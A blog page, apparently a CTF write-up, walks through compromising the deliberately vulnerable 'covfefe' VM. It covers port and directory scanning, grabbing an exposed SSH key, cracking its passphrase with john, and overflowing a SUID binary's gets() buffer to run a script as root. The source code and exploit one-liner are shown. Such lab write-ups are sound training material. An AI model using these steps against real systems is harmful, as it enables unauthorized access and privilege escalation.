@@ -1,0 +1,133 @@
+<!doctype html><html><head><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"\/"},"articleSection":"projects","name":"covfefe","headline":"covfefe","description":"Vulnerable VM image","inLanguage":"en","author":"","creator":"","publisher":"","accountablePerson":"","copyrightHolder":"","copyrightYear":"2018","datePublished":"2018-04-07 00:00:00 \u002b0000 UTC","dateModified":"2018-04-07 00:00:00 \u002b0000 UTC","url":"\/projects\/covfefe\/","wordCount":"781","keywords":["ctf","gobuster","execve","Blog"]}</script><title>covfefe</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.110.0"><meta name=description content="Vulnerable VM image"><meta name=twitter:card content="summary"><meta name=twitter:title content="covfefe"><meta name=twitter:description content="Vulnerable VM image"><meta name=twitter:site content="@brimston3"><meta property="og:title" content="covfefe"><meta property="og:description" content="Vulnerable VM image"><meta property="og:type" content="article"><meta property="og:url" content="/projects/covfefe/"><meta property="article:section" content="projects"><meta property="article:published_time" content="2018-04-07T00:00:00+00:00"><meta property="article:modified_time" content="2018-04-07T00:00:00+00:00"><meta property="og:image" content="//images/logo.png"><meta property="og:image:type" content="image/png"><meta property="og:image:width" content="512"><meta property="og:image:height" content="512"><meta itemprop=name content="covfefe"><meta itemprop=description content="Vulnerable VM image"><meta itemprop=datePublished content="2018-04-07T00:00:00+00:00"><meta itemprop=dateModified content="2018-04-07T00:00:00+00:00"><meta itemprop=wordCount content="781"><meta itemprop=keywords content="ctf,gobuster,execve,"><link rel=stylesheet href=/css/external.css><link rel=stylesheet href=/css/main.css><link rel=stylesheet href=/css/add-on.css><link rel=stylesheet href=/css/academicons.min.css></head><body><div id=wrapper><header id=header><h1><a href=/>projects</a></h1><nav class=links><ul><li><a href=/><i class="fa fa-home">&nbsp;</i>Home</a></li><li><a href=/blog/><i class="fa fa-newspaper-o">&nbsp;</i>Blog</a></li><li><a href=/projects/><i class="fa fa-list">&nbsp;</i>Projects</a></li><li><a href=/tags/><i class="fa fa-tags">&nbsp;</i>Tags</a></li></ul></nav><nav class=main><ul><li id=share-nav class=share-menu style=display:none><a class=fa-share-alt href=#share-menu>Share</a></li><li class=menu><a class=fa-bars href=#menu>Menu</a></li></ul></nav></header><section id=menu><section><form class=search method=get action=//google.com/search><input type=text name=q placeholder=Search>
+<input type=hidden name=as_sitesearch value=/></form></section><section><ul class=links><li><a href=/><h3><i class="fa fa-home">&nbsp;</i>Home</h3></a></li><li><a href=/blog/><h3><i class="fa fa-newspaper-o">&nbsp;</i>Blog</h3></a></li><li><a href=/projects/><h3><i class="fa fa-list">&nbsp;</i>Projects</h3></a></li><li><a href=/tags/><h3><i class="fa fa-tags">&nbsp;</i>Tags</h3></a></li></ul></section><section class=recent-posts><div class=mini-posts><header><h3>Recent Posts</h3></header><article class=mini-post><header><h3><a href=/blog/windows-mischief/>Windows Mischief</a></h3><time class=published datetime=2023-02-17>February 17, 2023</time></header></article><article class=mini-post><header><h3><a href=/blog/the-taste-of-the-day/>The Taste of the Day</a></h3><time class=published datetime=2019-12-20>December 20, 2019</time></header></article><article class=mini-post><header><h3><a href=/blog/blog-post-automation/>Blog Post Automation</a></h3><time class=published datetime=2019-12-06>December 6, 2019</time></header></article></div></section></section><section id=share-menu><section id=social-share-nav><ul class=links><header><h3>Share this post <i class="fa fa-smile-o"></i></h3></header><li><a href="//twitter.com/share?url=%2fprojects%2fcovfefe%2f&text=covfefe&via=brimston3" target=_blank class="share-btn email"><i class="fa fa-twitter"></i><p>Twitter</p></a></li>&nbsp;<li><a href="//www.facebook.com/sharer/sharer.php?u=%2fprojects%2fcovfefe%2f" target=_blank class="share-btn email"><i class="fa fa-facebook"></i><p>Facebook</p></a></li>&nbsp;<li><a href="//reddit.com/submit?url=%2fprojects%2fcovfefe%2f&title=covfefe" target=_blank class="share-btn email"><i class="fa fa-reddit-alien"></i><p>Reddit</p></a></li>&nbsp;<li><a href="//www.linkedin.com/shareArticle?url=%2fprojects%2fcovfefe%2f&title=covfefe" target=_blank class="share-btn email"><i class="fa fa-linkedin"></i><p>LinkedIn</p></a></li>&nbsp;<li><a href="//www.stumbleupon.com/submit?url=%2fprojects%2fcovfefe%2f&title=covfefe" target=_blank class="share-btn email"><i class="fa fa-stumbleupon"></i><p>StumbleUpon</p></a></li>&nbsp;<li><a href="//www.pinterest.com/pin/create/button/?url=%2fprojects%2fcovfefe%2f&description=covfefe" target=_blank class="share-btn email"><i class="fa fa-pinterest-p"></i><p>Pinterest</p></a></li>&nbsp;<li><a href="mailto:?subject=Check out this post by &body=%2fprojects%2fcovfefe%2f" target=_blank class="share-btn email"><i class="fa fa-envelope"></i><p>Email</p></a></li>&nbsp;</ul></section></section><div id=main><article class=post><header><div class=title><h1><a href=/projects/covfefe/>covfefe</a></h1><p>Vulnerable VM image</p></div><div class=meta><time class=published datetime=2018-04-07>April 7, 2018</time>
+<span class=author></span>
+<span class=author>CTF VM</span></div></header><section id=social-share><ul class=icons><li><a href="//twitter.com/share?url=%2fprojects%2fcovfefe%2f&text=covfefe&via=brimston3" target=_blank class="share-btn email"><i class="fa fa-twitter"></i><p>Twitter</p></a></li>&nbsp;<li><a href="//www.facebook.com/sharer/sharer.php?u=%2fprojects%2fcovfefe%2f" target=_blank class="share-btn email"><i class="fa fa-facebook"></i><p>Facebook</p></a></li>&nbsp;<li><a href="//reddit.com/submit?url=%2fprojects%2fcovfefe%2f&title=covfefe" target=_blank class="share-btn email"><i class="fa fa-reddit-alien"></i><p>Reddit</p></a></li>&nbsp;<li><a href="//www.linkedin.com/shareArticle?url=%2fprojects%2fcovfefe%2f&title=covfefe" target=_blank class="share-btn email"><i class="fa fa-linkedin"></i><p>LinkedIn</p></a></li>&nbsp;<li><a href="//www.stumbleupon.com/submit?url=%2fprojects%2fcovfefe%2f&title=covfefe" target=_blank class="share-btn email"><i class="fa fa-stumbleupon"></i><p>StumbleUpon</p></a></li>&nbsp;<li><a href="//www.pinterest.com/pin/create/button/?url=%2fprojects%2fcovfefe%2f&description=covfefe" target=_blank class="share-btn email"><i class="fa fa-pinterest-p"></i><p>Pinterest</p></a></li>&nbsp;<li><a href="mailto:?subject=Check out this post by &body=%2fprojects%2fcovfefe%2f" target=_blank class="share-btn email"><i class="fa fa-envelope"></i><p>Email</p></a></li>&nbsp;</ul></section><div id=content><p>This system was setup with a host only network on virtualbox 5.2.</p><p>Download from <a href=https://www.vulnhub.com/entry/covfefe-1,199/>vulnhub</a> or <a href="magnet:?xt=urn:btih:B5316F3BF3587A3F7377B95668655AF03DEA853B&dn=covfefe.ova&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969">magnet</a></p><h2 id=enumeration>Enumeration</h2><p>First nmap showed ports 22, 80, and 31337 open:</p><pre tabindex=0><code>root@sepha:/pentest# nmap -sS -A -n 192.168.56.101
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-06 20:19 UTC
+Nmap scan report for 192.168.56.101
+Host is up (0.00066s latency).
+Not shown: 997 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10 (protocol 2.0)
+| ssh-hostkey:
+|   2048 d0:6a:10:e0:fb:63:22:be:09:96:0b:71:6a:60:ad:1a (RSA)
+|   256 ac:2c:11:1e:e2:d6:26:ea:58:c4:3e:2d:3e:1e:dd:96 (ECDSA)
+|_  256 13:b3:db:c5:af:62:c2:b1:60:7d:2f:48:ef:c3:13:fc (ED25519)
+80/tcp    open  http    nginx 1.10.3
+|_http-server-header: nginx/1.10.3
+|_http-title: Welcome to nginx!
+31337/tcp open  http    Werkzeug httpd 0.11.15 (Python 3.5.3)
+| http-robots.txt: 3 disallowed entries
+|_/.bashrc /.profile /taxes
+|_http-title: 404 Not Found
+</code></pre><p>Running gobuster found really interesting files:</p><pre tabindex=0><code># gobuster -u http://192.168.56.101:31337 -w /pentest/seclists/Discovery/Web_Content/raft-medium-files.txt -e -r -l -opt
+
+Gobuster v1.3                OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://192.168.56.101:31337/
+[+] Threads      : 10
+[+] Wordlist     : /pentest/seclists/Discovery/Web_Content/raft-medium-files.txt
+[+] Status codes : 200,204,301,302,307
+[+] Show length  : true
+[+] Follow Redir : true
+[+] Expanded     : true
+=====================================================
+http://192.168.56.101:31337/robots.txt (Status: 200) [Size: 70] [Options: OPTIONS, HEAD, GET]
+http://192.168.56.101:31337/.ssh (Status: 200) [Size: 58] [Options: OPTIONS, HEAD, GET]
+http://192.168.56.101:31337/.bashrc (Status: 200) [Size: 3526] [Options: OPTIONS, HEAD, GET]
+http://192.168.56.101:31337/.bash_logout (Status: 200) [Size: 220] [Options: OPTIONS, HEAD, GET]
+http://192.168.56.101:31337/.bash_history (Status: 200) [Size: 2396] [Options: OPTIONS, HEAD, GET]
+=====================================================
+</code></pre><p>Taking a guess at http://192.168.56.101:31337/.ssh revealed an odd list, but hey, there&rsquo;s an ssh key:</p><pre tabindex=0><code># curl -i http://192.168.56.101:31337/.ssh; echo
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 58
+Server: Werkzeug/0.11.15 Python/3.5.3
+Date: Fri, 06 Apr 2018 16:28:10 GMT
+
+[&#39;id_rsa&#39;, &#39;authorized_keys&#39;, &#39;id_rsa.pub&#39;, &#39;known_hosts&#39;]
+</code></pre><h2 id=low-priv-access>Low priv access</h2><p>The authorized_keys file contained a username of <code>simon</code>. Trying id_rsa with <code>simon@192.168.56.101</code> worked, but prompted me for a password.</p><p>A little reseach found <a href="https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c?gi=212ba351e011">https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c?gi=212ba351e011</a></p><p>And the full steps are:</p><pre tabindex=0><code># ssh2john id_rsa &gt; id_rsa.hash
+# john --wordlist /pentest/seclists/Passwords/rockyou-75.txt --format=ssh id_rsa.hash
+Using default input encoding: UTF-8                                        
+Loaded 1 password hash (SSH [RSA/DSA 32/64])                                
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status              
+starwars         (id_rsa)
+1g 0:00:00:00 DONE (2018-04-06 19:33) 33.33g/s 22666p/s 22666c/s 22666C/s starwars    
+</code></pre><p>Using this password, I was able to get a low priv shell as the simon user.</p><h2 id=root-privs>Root privs</h2><p>Looking around a few things stood out. First:</p><pre tabindex=0><code>simon@covfefe:~$ find / -perm /6000 -type f 2&gt;/dev/null
+/usr/bin/wall
+/usr/bin/bsd-write
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/chage
+/usr/bin/chfn
+/usr/bin/ssh-agent
+/usr/bin/crontab                                                                  
+/usr/bin/gpasswd                                                                   
+/usr/bin/newgrp
+/usr/bin/expiry
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device                                                          
+/usr/lib/openssh/ssh-keysign                                                                   
+/usr/local/bin/read_message
+/bin/umount                                                                           
+/bin/su                                                                                     
+/bin/mount                                                                        
+/bin/ping                                                                             
+/sbin/unix_chkpwd
+</code></pre><p><code>/usr/local/bin/read_message</code> looked out of place. It&rsquo;s not a normal suid binary. Second:</p><pre tabindex=0><code>simon@covfefe:~$ cat .bash_history                                                      
+read_message
+exit                                                                                                                   
+</code></pre><p>Simon&rsquo;s .bash_history hinted at running <code>read_message</code>.</p><p>Running it without arguments was a little helpful:</p><pre tabindex=0><code>simon@covfefe:~$ read_message
+What is your name?
+simon
+Sorry simon, you&#39;re not Simon! The Internet Police have been informed of this violation.
+</code></pre><p>I tried <code>strings</code>, and <code>less</code> on it. Both are not installed on this system. I looked over it with <code>xxd</code> but nothing jumped out. Running it with the right name was more helpful:</p><pre tabindex=0><code>simon@covfefe:~$ read_message -h
+What is your name?
+Simon
+Hello Simon! Here is your message:
+Hi Simon, I hope you like our private messaging system.
+I&#39;m really happy with how it worked out!
+If you&#39;re interested in how it works, I&#39;ve left a copy of the source code in my home directory.
+- Charlie Root
+</code></pre><p>Sure enough, the code is available in /root/read_message.c:</p><pre tabindex=0><code>simon@covfefe:~$ cat /root/read_message.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+// You&#39;re getting close! Here&#39;s another flag:
+// flag2{use_the_source_luke}
+int main(int argc, char *argv[]) {
+    char program[] = &#34;/usr/local/sbin/message&#34;;
+    char buf[20];
+    char authorized[] = &#34;Simon&#34;;
+    printf(&#34;What is your name?\n&#34;);
+    gets(buf);
+    // Only compare first five chars to save precious cycles:
+    if (!strncmp(authorized, buf, 5)) {
+        printf(&#34;Hello %s! Here is your message:\n\n&#34;, buf);
+        // This is safe as the user can&#39;t mess with the binary location:
+        execve(program, NULL, NULL);
+    } else {
+        printf(&#34;Sorry %s, you&#39;re not %s! The Internet Police have been informed of this violation.\n&#34;, buf, authorized);
+        exit(EXIT_FAILURE);
+    }
+}
+</code></pre><p>That <code>execve</code> looks very attractive. It looks like the variables are stacked in a way to make exploiting this super trivial. After a little experimenting, I settled on the following:</p><pre tabindex=0><code>simon@covfefe:~$ printf &#34;Simon               /tmp/doit&#34; | read_message
+</code></pre><p>That&rsquo;s <code>Simon</code> followed by 15 spaces, the the name of a script I controlled in /tmp. The script didn&rsquo;t do anything terribly fancy, just copied simon&rsquo;s ssh key over to root&rsquo;s account and set the permissions so I could login there:</p><pre tabindex=0><code>simon@covfefe:~$ ssh root@localhost                                                       
+Enter passphrase for key &#39;/home/simon/.ssh/id_rsa&#39;:                                         
+Linux covfefe 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u2 (2017-06-26) i686
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent                                                      
+permitted by applicable law.                                                          
+root@covfefe:~#
+</code></pre><p>Don&rsquo;t forget that password. :)</p></div><footer><ul class=stats></ul></footer></article></div><section id=sidebar><section id=intro><a href=/><img src=/img/main/logo.jpg class=intro-circle width=100 alt=brimstone></a><header><h2>brimstone's blog</h2><p>Armchair architect × Agent of creativity & humor × Future compatible × Sysadmin finding poetry in code × AGPLv3 enthusiast × Timezone believer × he/him</p></header><ul class=icons><li><a href=//github.com/brimstone target=_blank title=GitHub class="fa fa-github"></a></li><li><a href=//twitter.com/brimston3 target=_blank title=Twitter class="fa fa-twitter"></a></li><li><a href=mailto:brimstone@the.narro.ws title=Email class="fa fa-envelope"></a></li></ul></section><section class=recent-posts><div class=mini-posts><header><h3>Recent Posts</h3></header><div class=posts-container><article class=mini-post><header><h3><a href=/blog/windows-mischief/>Windows Mischief</a></h3><time class=published datetime=2023-02-17>February 17, 2023</time></header></article><article class=mini-post><header><h3><a href=/blog/the-taste-of-the-day/>The Taste of the Day</a></h3><time class=published datetime=2019-12-20>December 20, 2019</time></header></article><article class=mini-post><header><h3><a href=/blog/blog-post-automation/>Blog Post Automation</a></h3><time class=published datetime=2019-12-06>December 6, 2019</time></header></article></div></div><div class=mini-posts><header><h3>Recent Projects</h3></header><div class=posts-container><article class=mini-post><header><h3><a href=/projects/machine-learning-research/>Machine Learning Research</a></h3><time class=published datetime=2023-02-17>February 17, 2023</time></header></article><article class=mini-post><header><h3><a href=/projects/free-services/>Free Services</a></h3><time class=published datetime=2023-02-17>February 17, 2023</time></header></article><article class=mini-post><header><h3><a href=/projects/vulnerable-windows-drivers/>Vulnerable Windows Drivers</a></h3><time class=published datetime=2021-04-11>April 11, 2021</time></header></article><article class=mini-post><header><h3><a href=/projects/raspberry-pi-aarch64/>Raspberry Pi aarch64</a></h3><time class=published datetime=2021-03-22>March 22, 2021</time></header></article><article class=mini-post><header><h3><a href=/projects/d1-mini/>D1 mini</a></h3><time class=published datetime=2021-03-13>March 13, 2021</time></header></article></div><a href=/blog/ class=button>View more projects</a></div></section><section id=footer><p class=copyright>&copy; 2023
+brimstone's blog
+.
+Powered by <a href=//gohugo.io target=_blank>Hugo</a></p></section></section></div><a id=back-to-top href=# class="fa fa-arrow-up fa-border fa-2x"></a>
+<script src=/js/external.js></script>
+<script src=/js/util.js></script>
+<script src=/js/main.js></script>
+<script src=/js/backToTop.js></script>
+<script>hljs.initHighlightingOnLoad()</script></body></html>
